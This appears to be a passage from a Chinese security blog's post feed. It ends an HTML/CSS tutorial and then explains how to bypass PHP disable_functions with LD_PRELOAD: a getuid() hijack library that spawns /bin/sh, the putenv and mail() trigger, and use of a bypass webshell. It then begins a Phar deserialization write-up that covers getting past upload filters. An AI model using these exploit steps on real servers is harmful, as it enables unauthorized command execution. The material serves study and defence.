<span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>111<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>111<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 列 --&gt;</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">表单元素  </span><br><span class="line">```html</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;邮箱&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 单选按钮 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;第一组&quot;</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;a&quot;</span>&gt;</span>111<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 同一组单选按钮的name属性的值必须相同。</span></span><br><span class="line"><span class="comment">   保证&lt;label&gt;标签（按钮的文本描述标签）中的for属性值和对应的&lt;input&gt;中的id属性值一样。--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 复选按钮 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;第二组&quot;</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;a&quot;</span>&gt;</span>111<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;第二组&quot;</span> <span class="attr">id</span>=<span class="string">&quot;b&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;b&quot;</span>&gt;</span>222<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 下拉菜单 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;type&quot;</span>&gt;</span>菜单的描述<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;shop_type&quot;</span> <span class="attr">id</span>=<span class="string">&quot;type&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>伪类：状态为类+结构为类+伪元素  </p><pre><code class="css">/* 状态 */:link 未访问状态:visited 已访问状态:hover 鼠标悬停状态:active 点击状态:focus 获得焦点元素/* 结构 */:first-child 第一个元素:last-child 最后一个元:nth-child(n) 匹配第n个元素/* 伪元素 */概念： 创建了新元素，并通过新元素来添加样式。插入图片：无需引号，比如content: url(图像的链接);插入文本：需要引号，比如content: &quot;文本内容&quot;;注意，::before和::after伪元素必须有content属性，没有需要插入的内容时可以设置为空，即content: &quot;&quot;;</code></pre><p>盒子的概念: 边框 圆角 内容区 内边距 外边距  </p><p><img src="/img/html1.png" alt="1"><br><img src="/img/html2.png" alt="1"><br><img src="/img/html3.png" alt="1"><br>（1）用width属性可以指定内容区的宽度</p><p>（2）用height属性可以指定内容区的高度（但是在实际开发中，一般不会手动指定固定高度）</p><p>width与height 对行内、非替换元素无效。  </p><p><img src="/img/html4.png" alt="1"><br><img src="/img/html5.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LD_PRELOAD</title>
      <link href="/2024/02/26/LD_PRELOAD/"/>
      <url>/2024/02/26/LD_PRELOAD/</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><code>LD_PRELOAD</code> 是一个在 Linux 系统中非常强大的环境变量</p><p><code>LD_PRELOAD</code> 是 Linux 动态链接器 <code>ld.so</code> 提供的一项功能。其工作原理是：当程序运行时，操作系统会加载它所需的共享库（.so 文件），而 <code>LD_PRELOAD</code> 可以在加载这些库之前指定先加载哪些库。这就意味着：</p><ul><li>如果在 <code>LD_PRELOAD</code> 中列出的库与程序原本需要的库存在相同的函数定义，那么 <code>LD_PRELOAD</code> 中的函数会<strong>覆盖</strong>原本库中的相应函数实现。</li><li>如果 <code>LD_PRELOAD</code> 中的库没有覆盖原本的函数，那么程序会正常地继续加载它需要的库。</li></ul><p>我们通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>能够上传自己的<code>.so</code>文件</p><p>能够控制LD_PRELOAD环境变量的值，比如<code>putenv()</code>函数</p><p>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以<code>控制PHP启动外部程序</code>的函数并能执行，比如<code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code>和<code>error_log()</code>函数等</p><h3 id="动态链接机制的工作原理"><a href="#动态链接机制的工作原理" class="headerlink" title="动态链接机制的工作原理"></a>动态链接机制的工作原理</h3><p>当你在 Linux 系统中运行一个程序时，程序通常会依赖多个共享库（共享对象 <code>.so</code> 文件）。动态链接器（<code>ld.so</code>）的任务就是在程序启动时找到并加载这些共享库，同时解析程序中需要的函数符号（函数的地址和实现）。这个过程大致包括以下几个步骤：</p><ol><li><strong>程序启动时的符号解析</strong>：程序代码中如果需要调用某个函数（例如 <code>b()</code>），链接器会根据程序运行时的动态库依赖，去找到包含这个函数的共享对象（如 <code>c.so</code>）。</li><li><strong>符号查找顺序</strong>：当动态链接器解析符号（例如函数 <code>b()</code>）时，它遵循一定的顺序。这就决定了程序会首先找到哪个库中的 <code>b()</code> 实现。</li></ol><h3 id="LD-PRELOAD-如何改变符号查找顺序"><a href="#LD-PRELOAD-如何改变符号查找顺序" class="headerlink" title="LD_PRELOAD 如何改变符号查找顺序"></a><code>LD_PRELOAD</code> 如何改变符号查找顺序</h3><p>通常情况下，动态链接器按照以下步骤查找符号：</p><ol><li><strong>程序内部定义的符号</strong>：首先，动态链接器会在程序内部查找符号（函数、变量等）。</li><li><strong>依赖的共享库</strong>：如果程序没有定义这个符号，链接器就会去查找程序依赖的共享库。例如，如果程序依赖 <code>c.so</code>，就会在 <code>c.so</code> 中寻找 <code>b()</code> 的实现。</li><li><strong>标准系统库</strong>：如果依赖库中也没有找到，动态链接器会继续在标准系统库（如 libc.so 等）中查找。</li></ol><p>然而，当设置了 <code>LD_PRELOAD</code> 环境变量时，动态链接器的查找顺序发生了改变：</p><ul><li><strong><code>LD_PRELOAD</code> 指定的库优先级最高</strong>：如果 <code>LD_PRELOAD</code> 设置了一个或多个共享库（如 <code>c_evil.so</code>），那么在符号解析时，动态链接器会首先在这些预加载的库中寻找符号。</li><li>如果在 <code>LD_PRELOAD</code> 指定的库中找到了目标符号（如 <code>b()</code>），那么这个符号会覆盖原本系统中默认共享库中的符号。</li></ul><blockquote><p>这意味着，<strong>在 <code>LD_PRELOAD</code> 设置了 <code>c_evil.so</code> 的情况下，动态链接器会优先在 <code>c_evil.so</code> 中查找函数 <code>b()</code> 的定义</strong>，而不会去查找系统的 <code>c.so</code> 中的 <code>b()</code> 函数。</p></blockquote><p>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h3 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3><h4 id="1-编写-getuid-函数并编译为共享对象"><a href="#1-编写-getuid-函数并编译为共享对象" class="headerlink" title="1. 编写 getuid() 函数并编译为共享对象"></a>1. 编写 <code>getuid()</code> 函数并编译为共享对象</h4><p>攻击者编写一个和标准库中 <code>getuid()</code> 函数具有相同签名的函数。<code>getuid()</code> 是一个标准的 POSIX 系统调用，它返回调用进程的用户 ID。因为许多程序（如 <code>sendmail</code>）在运行过程中会调用这个函数，所以攻击者可以利用它作为一个劫持的目标。</p><p>攻击者编写的 <code>getuid()</code> 函数不仅返回用户 ID，还可以包含恶意代码，如执行系统命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的 getuid() 函数，模拟标准的系统调用</span></span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">getuid</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里执行恶意操作，比如启动一个 shell</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">// 启动 shell</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个假的 UID 或者真实的 UID，保证正常流程不受影响</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1000</span>;  <span class="comment">// 返回一个伪造的 UID，程序继续正常运行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译</strong>成共享对象（动态链接库），以便之后通过 <code>LD_PRELOAD</code> 进行加载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o getuid_shadow.so getuid_shadow.c</span><br></pre></td></tr></table></figure><ul><li>**<code>-fPIC</code>**：表示生成位置无关代码（Position Independent Code），这是创建共享库时所需的。</li><li>**<code>-shared</code>**：表示编译成一个共享对象 <code>.so</code> 文件。</li></ul><p>生成的 <code>getuid_shadow.so</code> 是一个包含攻击者自定义 <code>getuid()</code> 实现的共享对象。</p><h4 id="2-使用-putenv-设置-LD-PRELOAD-环境变量"><a href="#2-使用-putenv-设置-LD-PRELOAD-环境变量" class="headerlink" title="2. 使用 putenv() 设置 LD_PRELOAD 环境变量"></a>2. 使用 <code>putenv()</code> 设置 <code>LD_PRELOAD</code> 环境变量</h4><p>接下来，攻击者利用 PHP 的 <code>putenv()</code> 函数来设置环境变量 <code>LD_PRELOAD</code>，从而劫持程序对 <code>getuid()</code> 函数的调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/path/to/getuid_shadow.so&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong><code>LD_PRELOAD</code></strong> 是一个环境变量，它告诉 Linux 动态链接器在加载任何共享库之前，首先加载 <code>LD_PRELOAD</code> 指定的共享对象。这样，当任何新进程启动时，系统首先会加载攻击者指定的共享对象 <code>getuid_shadow.so</code>，然后使用这个共享对象中实现的 <code>getuid()</code> 函数，而不是系统库中的 <code>getuid()</code>。</li><li>使用 PHP 的 <code>putenv()</code> 函数可以在 PHP 进程的环境中设置这个变量，影响后续的进程（如 <code>sendmail</code>）加载的共享库顺序。</li></ul><h4 id="3-利用-mail-函数触发新进程的创建"><a href="#3-利用-mail-函数触发新进程的创建" class="headerlink" title="3. 利用 mail() 函数触发新进程的创建"></a>3. 利用 <code>mail()</code> 函数触发新进程的创建</h4><p>接下来，攻击者调用 PHP 的 <code>mail()</code> 函数。虽然 PHP 的常规命令执行函数（如 <code>system()</code>、<code>exec()</code>）可能已被禁用，但 <code>mail()</code> 函数通常仍然可以使用，并且 <code>mail()</code> 函数内部会启动 <code>sendmail</code> 进程来发送邮件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;example@example.com&quot;</span>, <span class="string">&quot;Test Subject&quot;</span>, <span class="string">&quot;Test Message&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong><code>mail()</code> 函数</strong>是 PHP 内置的一个函数，用于发送电子邮件。在内部，<code>mail()</code> 函数会调用系统的邮件传送代理（如 <code>sendmail</code>），这会启动一个新的进程 <code>/usr/sbin/sendmail</code>。</li><li><code>sendmail</code> 在其执行过程中，通常会调用系统函数 <code>getuid()</code> 来获取当前用户的 UID。</li></ul><h4 id="4-LD-PRELOAD-的作用：劫持-getuid-函数"><a href="#4-LD-PRELOAD-的作用：劫持-getuid-函数" class="headerlink" title="4. LD_PRELOAD 的作用：劫持 getuid() 函数"></a>4. <code>LD_PRELOAD</code> 的作用：劫持 <code>getuid()</code> 函数</h4><p>由于 <code>putenv()</code> 已经将 <code>LD_PRELOAD</code> 设置为攻击者的共享对象 <code>getuid_shadow.so</code>，所以当 <code>sendmail</code> 进程启动并调用 <code>getuid()</code> 函数时，系统会首先加载并使用 <code>getuid_shadow.so</code> 中的 <code>getuid()</code> 函数，而不是标准库中的 <code>getuid()</code>。</p><p>因此，<code>sendmail</code> 进程在执行 <code>getuid()</code> 时，实际上调用的是攻击者的恶意版本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">// 启动一个 shell</span></span><br></pre></td></tr></table></figure><p>这会执行攻击者指定的恶意操作（如启动 shell，执行其他系统命令等）。通过这种方式，攻击者绕过了 PHP 中对系统命令执行函数的限制，而成功执行了操作系统级别的命令。</p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>一是，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；</p><p>二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。</p><h2 id="大佬yangyangwithgnu的破局"><a href="#大佬yangyangwithgnu的破局" class="headerlink" title="大佬yangyangwithgnu的破局"></a>大佬yangyangwithgnu的破局</h2><p>在加载时就执行代码（拦劫启动进程），而不用考虑劫持某一系统函数</p><blockquote><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p></blockquote><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在共享对象加载时执行的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_library</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_library</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Library loaded! Executing constructor function.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个普通的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_function</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a function in the shared object.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libexample.so -fPIC libexample.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *handle;</span><br><span class="line">    <span class="type">void</span> (*func)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 动态加载共享对象</span></span><br><span class="line">    handle = dlopen(<span class="string">&quot;./libexample.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找函数地址</span></span><br><span class="line">    func = dlsym(handle, <span class="string">&quot;my_function&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!func) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用共享对象中的函数</span></span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭共享对象</span></span><br><span class="line">    dlclose(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**<code>RTLD_LAZY</code>**：表示惰性解析符号。也就是说，只有在符号（函数或变量）真正被使用时，才会解析该符号。这种方式提高了性能，特别是在库中有很多函数时，程序只会解析实际需要调用的函数。</p><p>另一个常见的标志是 **<code>RTLD_NOW</code>**，它会立即解析库中的所有符号。如果符号解析失败，<code>dlopen()</code> 将立即返回错误。</p><p><strong><code>dlsym()</code></strong> 用于获取共享库中指定函数的地址。它的第一个参数是 <code>dlopen()</code> 返回的句柄，第二个参数是要查找的函数名称（以字符串形式给出）。在这里，查找的是 <code>libexample.so</code> 中的 <code>my_function</code> 函数。</p><p>如果找到了指定的函数，<code>dlsym()</code> 返回该函数的地址，程序可以通过函数指针 <code>func</code> 调用它。如果没有找到指定的符号，<code>dlsym()</code> 返回 <code>NULL</code>，并通过 <code>dlerror()</code> 获取错误信息。</p><p><strong><code>dlclose()</code></strong> 用于关闭通过 <code>dlopen()</code> 打开的共享库，并释放其相关资源。关闭后，句柄 <code>handle</code> 将不再有效，程序不能再通过它访问共享库中的符号。</p><p>如果不调用 <code>dlclose()</code>，共享库会一直保持在内存中，直到程序退出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main main.c -ldl</span><br><span class="line">./main</span><br></pre></td></tr></table></figure><p>通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p><p>项目中有三个关键文件，bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so。</p><p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p>一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd 参数中重定向。</p><p>bypass_disablefunc_x64.so 为执行命令的共享对象，用命令 <code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so</code> 将 bypass_disablefunc.c 编译而来。 若目标为 x86 架构，需要加上 -m32 选项重新编译，bypass_disablefunc_x86.so。</p><p>想办法将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标，指定好三个 GET 参数后，bypass_disablefunc.php 即可突破 disable_functions。执行 <code>cat /proc/meminfo</code>：</p><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>对于bypass_disablefunc.php，权限上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：</p><p>Antsword有插件。</p><p>我们选择<code>LD_PRELOAD</code>模式并点击开始按钮，成功后蚁剑会在<code>/var/www/html</code>目录里上传一个<code>.antproxy.php</code>文件。我们创建副本, 并将连接的 URL shell 脚本名字改为<code>.antproxy.php</code>获得一个新的shell，在这个新shell里面就可以成功执行命令了。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar反序列化漏洞详解</title>
      <link href="/2024/02/26/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/02/26/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHAR漏洞详解"><a href="#PHAR漏洞详解" class="headerlink" title="PHAR漏洞详解"></a>PHAR漏洞详解</h1><p><strong>PHAR（PHP Archive）文件格式</strong> 是PHP内置的归档文件格式，类似于<code>ZIP</code>、<code>TAR</code>等，它可以将多个文件打包成一个文件进行处理。PHAR文件的设计目的是为了简化分发和使用PHP程序。然而，由于PHAR文件包含了序列化数据，它也容易受到和PHP反序列化相关的漏洞攻击，例如<strong>反序列化漏洞</strong>和<strong>文件包含漏洞</strong>。</p><p>PHAR漏洞一般涉及到<strong>反序列化攻击</strong>和<strong>文件包含</strong>漏洞的结合，具体表现为<strong>通过文件包含函数读取PHAR文件中的序列化数据，从而引发反序列化攻击</strong>。</p><h3 id="PHAR文件的工作原理"><a href="#PHAR文件的工作原理" class="headerlink" title="PHAR文件的工作原理"></a>PHAR文件的工作原理</h3><p>PHAR文件内部由多个部分组成，包括文件内容和元数据。PHAR的元数据部分是一个可被序列化的PHP对象。因此，PHAR文件本质上包含了一个序列化的PHP对象，当这个PHAR文件被读取或操作时，PHP会<code>自动</code>将元数据反序列化。</p><blockquote><p>意味着：<strong>该方法在 文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar:&#x2F;&#x2F;伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作</strong>。</p></blockquote><h1 id="PHAR-文件的大体结构可以分为-4-个部分："><a href="#PHAR-文件的大体结构可以分为-4-个部分：" class="headerlink" title="PHAR 文件的大体结构可以分为 4 个部分："></a>PHAR 文件的大体结构可以分为 4 个部分：</h1><hr><h3 id="1-Stub（文件标识）"><a href="#1-Stub（文件标识）" class="headerlink" title="1. Stub（文件标识）"></a>1. <strong>Stub（文件标识）</strong></h3><p><code>Stub</code> 是 PHAR 文件的标志，用来表明该文件是一个 PHAR 文件。这个部分通常是 PHP 代码，并且以 <code>__HALT_COMPILER();</code> 结尾，表示停止 PHP 编译器的进一步执行。任何位于 <code>__HALT_COMPILER()</code> 之后的二进制数据都不会被当作 PHP 代码执行。</p><h4 id="典型的-Stub-代码："><a href="#典型的-Stub-代码：" class="headerlink" title="典型的 Stub 代码："></a>典型的 <code>Stub</code> 代码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="title function_ invoke__">mapPhar</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;phar://phar.phar/index.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">__HALT_COMPILER</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>该部分表示 PHAR 文件的“入口”，<code>Phar::mapPhar()</code> 用来加载 PHAR 文件，并使用 <code>include</code> 引入其中的文件。</li><li><strong>绕过上传限制</strong>：由于 <code>Stub</code> 部分可以是任意 PHP 代码，只要最后以 <code>__HALT_COMPILER();</code> 结束，因此攻击者可以构造一个带有这个标志的文件（例如伪造为图片格式），从而绕过文件上传限制（例如上传过滤器只允许图片文件）。只要文件中包含合法的 <code>Stub</code> 结尾，PHP 解释器就会将它识别为 PHAR 文件。</li></ul><hr><h3 id="2-Manifest（文件内容的描述）"><a href="#2-Manifest（文件内容的描述）" class="headerlink" title="2. Manifest（文件内容的描述）"></a>2. <strong>Manifest（文件内容的描述）</strong></h3><p><code>Manifest</code> 是 PHAR 文件的核心元数据部分，它描述了 PHAR 文件内部包含的所有文件的信息。这包括：</p><ul><li>每个文件的名称、大小、时间戳、文件权限、校验和等属性。</li><li>还包括序列化的用户自定义 <code>meta-data</code>，这是 PHAR 漏洞利用的关键部分。</li></ul><h4 